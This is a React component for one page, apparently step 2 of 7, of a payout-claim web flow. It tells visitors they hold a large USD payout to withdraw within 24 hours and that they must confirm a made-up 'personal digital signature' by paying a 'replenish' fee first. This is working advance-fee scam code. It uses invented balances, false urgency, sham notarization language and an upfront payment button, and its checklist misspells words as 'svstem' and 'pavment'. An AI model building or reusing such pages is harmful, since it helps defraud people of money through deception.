import moment from "moment"
import { Text, Flex, Box, Icon, Image, Button } from "@chakra-ui/react"
import React, { useCallback } from "react"
import ChatCard from "../../components/ChatCard"
import { useSelector } from "react-redux"
import { thousandsFormatter, useGoTo } from "../../utils"
import FormCheckItem from "../../components/FormCheckItem"
import { COMMISSION_PAGE, COMMISSION_TLS_PAGE } from "../../constants"
import { useNavigate } from "react-router-dom"

const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_TLS_PAGE}`
// 2-7
const Signatureverify = () => {
  const balance = useSelector(state => state.user.balance)

  const links = useSelector(state => state.data.links)

  const prices = useSelector(state => state.data.prices)

  // const goToNext = useGoTo()

  const navigate = useNavigate()

  const onClick = useCallback(() => {
    const link = links?.[27]

    if (!link) return

    window.open(`${window.location.origin}${links?.[27]}`, "_self")
  }, [links?.[27]])

  return (
    <ChatCard
      position={"relative"}
      minH={{ base: "calc(100vh - 112px)", sm: "fit-content" }}
      bodyStyles={{
        padding: { base: "40px 20px 20px", md: "30px" }
      }}
    >
      <Box
        display={"grid"}
        gridTemplateColumns={{ base: "1fr", md: "1fr 1fr" }}
        gridTemplateRows={{ base: "auto", md: "repeat(2, min-content)" }}
        gap={"30px"}
      >
        <Flex
          flexDir={{ base: "column", md: "row" }}
          alignItems={{ base: "center", md: "flex-start" }}
          gap={{ md: "30px" }}
        >
          <Box textAlign={{ base: "center", md: "left" }}>
            <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
              Your payout amount is:
            </Text>
            <Text
              fontSize={{ base: "40px", md: "40px" }}
              fontWeight={"bold"}
              color={"brand.600"}
              background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
              whiteSpace={"nowrap"}
              sx={{
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent"
              }}
            >
              {`$${thousandsFormatter(balance)}`}
              <Text as={"span"} fontSize={"18px"}>
                {" "}
                USD
              </Text>
            </Text>
          </Box>
          <Text
            color={"pink.100"}
            fontSize={{ base: "16px", md: "20px" }}
            textAlign={{ base: "center", md: "left" }}
            width={{ md: "40%" }}
          >
            You need to withdraw money within 24 hours!
          </Text>
        </Flex>
        <Flex
          flexDir={"column"}
          justifyContent={{ md: "flex-start" }}
          gridRow={"span 2"}
        >
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"600"}
            textAlign={{ base: "center", md: "left" }}
          >
            It is necessary to confirm the digital signature
          </Text>
          <br />
          <Text fontSize={{ base: "16px", md: "20px" }}>
            Your personal digital signature is made and ready for use! The
            cipher of personal digital signature rdl_356279. You have to confirm
            a personal digital signature in order to receive a transfer for the
            amount of <b>${balance}</b> reserved for sending today.
            <br />
            <br />
            Confirmation of the digital signature must be assured notarized, we
            made sure that it was convenient for you to confirm the digital
            signature right on the site.
            <br />
            <br />
            Confirm the personal digital signature for receipt{" "}
            <b>${balance}.</b>
          </Text>
        </Flex>
        <Flex flexDir={"column"} fontSize={"20px"}>
          <Text fontSize={"20px"} mb={"30px"}>
            Immediately after replenishing the transfer amount, you will fully
            send a money transfer to the indicated details in the amount{" "}
            <b>${balance}.</b>
            <br />
            <br />
            Replenish the transfer amount to: <b>${prices?.[27]}.</b>
          </Text>
          <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
            <FormCheckItem
              checked={true}
              label={"Replenish your balance for the specified amount."}
            />
            <FormCheckItem
              checked={true}
              label={"The svstem will automatically check your signature."}
            />
            <FormCheckItem
              checked={true}
              label={"Your pavment will be sent to your details."}
            />
          </Flex>
        </Flex>
      </Box>
      <Flex
        flexDir={{ base: "column-reverse", md: "row" }}
        justifyContent={{ md: "space-between" }}
        alignItems={"center"}
      >
        <Image
          src="./img/secure-payment.png"
          w={"120px"}
          margin={{ base: "50px auto", sm: "60px 0 0" }}
        />
        <Flex
          mt={"40px"}
          flexDir={{ base: "column", md: "row" }}
          alignItems={"center"}
        >
          <Button
            mb={"10px"}
            mr={{ md: "40px" }}
            onClick={onClick}
            minW={"150px"}
          >
            Replenish balance
          </Button>
        </Flex>
      </Flex>
    </ChatCard>
  )
}

export default Signatureverify
